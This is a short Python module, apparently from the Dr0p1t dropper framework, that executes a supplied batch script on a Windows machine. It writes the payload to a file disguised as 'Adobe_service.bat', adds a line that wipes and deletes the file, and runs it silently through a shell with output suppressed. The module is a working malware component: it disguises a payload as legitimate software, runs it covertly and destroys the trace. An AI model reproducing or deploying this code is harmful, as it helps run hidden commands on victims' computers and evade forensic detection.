#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run batchfile scripts (bat)
#Start

def F2215(tobe):
	f = open("Adobe_service.bat","w")
	f.write(tobe)
	f.write("\n"+'break>"%~f0" && DEL "%~f0"')
	f.close()
	blah = subprocess.Popen("Adobe_service.bat >> NUL",shell=True)

F2215(Bat_Script_Data)
